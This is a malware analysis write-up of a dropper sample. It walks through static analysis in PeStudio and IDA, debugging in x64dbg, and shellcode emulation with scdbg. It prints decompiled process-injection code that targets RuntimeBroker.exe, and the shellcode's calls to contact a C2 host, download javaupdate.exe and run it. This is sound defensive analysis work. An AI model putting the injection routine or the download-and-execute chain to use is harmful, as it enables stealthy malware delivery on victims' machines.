# Dropper.DownloadAndRunEXE.exe

## Identification:

**FileName:** Dropper.DownloadAndRunEXE.exe

**SHA256:** f40fd89b764f2c952de772d9cec995929112b29d3dcfe15c8cdbff93efc2431d

**FileSize:** 905216 (bytes)

<br>

## Analysis:

The analysis on the sample was started with static analysis by loading it in PeStudio tool. First the sections were checked, where the section names were normal and entropy was also found to be normal as shown below. 

<image src="../Images/Dropper.DownloadAndRunEXE.exe1.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

After that, the imports API used by this sample were checked, where interesting APIs relating to Process Injection were found which are listed below.

    CreateToolhelp32Snapshot
    Process32First
    Process32Next
    OpenProcess
    VirtualAllocEx
    WriteProcessMemory
    CreateRemoteThread

The sample was then loaded in IDA for static code analysis. Using the above identified import APIs as reference, the code of this sample were explored.

    __int64 sub_401785()
    {
      PROCESSENTRY32 pe; // [rsp+20h] [rbp-60h] BYREF
      HANDLE hSnapshot; // [rsp+150h] [rbp+D0h]
      DWORD th32ProcessID; // [rsp+15Ch] [rbp+DCh]
    
      th32ProcessID = -1;
      hSnapshot = CreateToolhelp32Snapshot(2u, 0);
      if ( hSnapshot == (HANDLE)-1i64 )
        return 0i64;
      pe.dwSize = 304;
      if ( Process32First(hSnapshot, &pe) )
      {
        do
        {
          if ( !strcmp(pe.szExeFile, "RuntimeBroker.exe") && th32ProcessID > pe.th32ProcessID )
            th32ProcessID = pe.th32ProcessID;
        }
        while ( Process32Next(hSnapshot, &pe) );
        CloseHandle(hSnapshot);
        return th32ProcessID;
      }
      else
      {
        CloseHandle(hSnapshot);
        return 0i64;
      }
    }

First from this piece of code disassembled using IDA as shown above, it can be seen that this sample will take snapshot of all the running process using **CreateToolhelp32Snapshot** API. Then, it will enumerate among those captured process using **Process32First** and **Process32Next** APIs till it found the 'RuntimeBroker.exe' From this code, it can be concluded that it will enumerate all the running processes to find the 'RuntimeBroker.exe' process in order to inject something into that process.

    __int64 __fastcall sub_4015B4(DWORD a1)
    {
      __int64 v1; // rcx
      void *v2; // rsp
      _BYTE v4[32]; // [rsp+0h] [rbp-80h] BYREF
      char v5[480]; // [rsp+40h] [rbp-40h] BYREF
      HANDLE RemoteThread; // [rsp+220h] [rbp+1A0h]
      LPVOID lpBaseAddress; // [rsp+228h] [rbp+1A8h]
      HANDLE hProcess; // [rsp+230h] [rbp+1B0h]
      LPCVOID lpBuffer; // [rsp+238h] [rbp+1B8h]
      __int64 v10; // [rsp+240h] [rbp+1C0h]
      SIZE_T nSize; // [rsp+248h] [rbp+1C8h]
    
      qmemcpy(&v4[64], byte_4B3008, 0x1D0ui64);
      v1 = byte_4B3008[464];
      v4[528] = v1;
      nSize = 465i64;
      v10 = 464i64;
      v2 = alloca(sub_40D560(v1, &byte_4B3008[465], 465i64, 0i64));
      lpBuffer = v5;
      sub_401560(v5, 465i64, v5);
      hProcess = OpenProcess(0x1F0FFFu, 0, a1);
      lpBaseAddress = VirtualAllocEx(hProcess, 0i64, 0x1D1ui64, 0x3000u, 0x40u);
      WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, 0i64);
      RemoteThread = CreateRemoteThread(hProcess, 0i64, 0i64, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0i64, 0, 0i64);
      CloseHandle(hProcess);
      return 0i64;
    }

From the above piece of disassembled code from IDA, it can be seen that the sample will first try to get the handle to the 'RuntimeBroker.exe' process  using **OpenProcess** API. Using that handle, the sample can inject something into that process. For this, the sample will allocate some space in that remote process of 'RuntimeBroker.exe' using **VirtualAllocEx** and then write its payload using **WriteProcessMemory** API. Finally, it will execute the injected payload using the **CreateRemoteThread** API.

Lets now analyze it dynamically through debugging and try to extract the payload. For this, the sample was loaded in x64dbg. In this process injection technique, this sample will write its payload into 'RuntimeBroker.exe' using **WriteProcessMemory** API. The 2nd parameter of this API will point to the base address to which data is written, i.e., where the shellcode is written.

In X64dbg, the second parameter of **WriteProcessMemory** API can be seen where the rcx value is being moved to r8. The rcx should point to base address where data is written which is being saved to r8.

<image src="../Images/Dropper.DownloadAndRunEXE.exe2.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

Following the rcx value in dump will show the possible shellcode being written in the remote process. The dump is shown below.

<image src="../Images/Dropper.DownloadAndRunEXE.exe3.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

The above suspected shellcode dump was then selected and saved to a file as shellcode.text.

Now the shellcode was decoded using scdbg tool with the command.

`scdbg /f shellcode.txt -s -1`

    Loaded 3a0 bytes from file shellcode.txt  
    Detected straight hex encoding input format converting...  
    Initialization Complete..  
    Max Steps: -1  
    Using base offset: 0x401000  
      
    4010a4 LoadLibraryA(wininet)  
    4010b2 InternetOpenA(wininet)  
    4010cb InternetConnectA(server: burn.ec2-13-7-109-121-ubuntu-2004.local, port: 443, )  
    4010e3 HttpOpenRequestA()  
    4010fc InternetSetOptionA(h=4893, opt=1f, buf=12fdf4, blen=4)  
    40110a HttpSendRequestA()  
    401139 CreateFileA(javaupdate.exe) = 4  
    401155 InternetReadFile(4893, buf: 12faf4, size: 300)  
    40117c CloseHandle(4)  
    401186 WinExec(javaupdate.exe)  
    40118f ExitProcess(0)  
      
    Stepcount 5043493

From the output, interesting information were found:
- First, it will load wininet library to carry out network activities.
- The shellcode will reach to its C2 burn[.]ec2-13-7-109-121-ubuntu-2004[.]local over port 443 using **InternetConnet** API and request and download a file named 'javaupdate.exe'.
- Then using **WinExec** API, it will execute the downloaded 'javaupdate.exe'.
